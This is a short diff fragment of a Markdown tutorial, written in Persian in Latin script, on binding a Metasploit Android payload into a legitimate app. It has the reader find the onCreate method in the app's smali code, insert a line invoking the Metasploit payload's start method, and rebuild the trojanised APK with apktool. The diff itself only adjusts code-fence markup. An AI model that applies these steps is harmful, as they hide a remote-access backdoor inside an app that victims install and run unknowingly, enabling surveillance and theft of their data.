@@ -41,9 +41,8 @@ example : Poshe smali > Poshe com > Poshe google > Poshe android > Poshe gms > P
 - Dakhel file migardim donbal ebarat `onCreate(Landroid/os/Bundle;)v` Agar chand ta bood , On k avvalesh `method` Dare
 - Ye Enter mizanim va khat badi en `invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V` ro ezafe mikonim
 
-```
+
 Dige ba "rat" kari nadarim va "app asli" ro Recompile mikonim va Tamam ....
 
 ```bash
 apktool b /home/kali/Dekstop/app.apk
-```
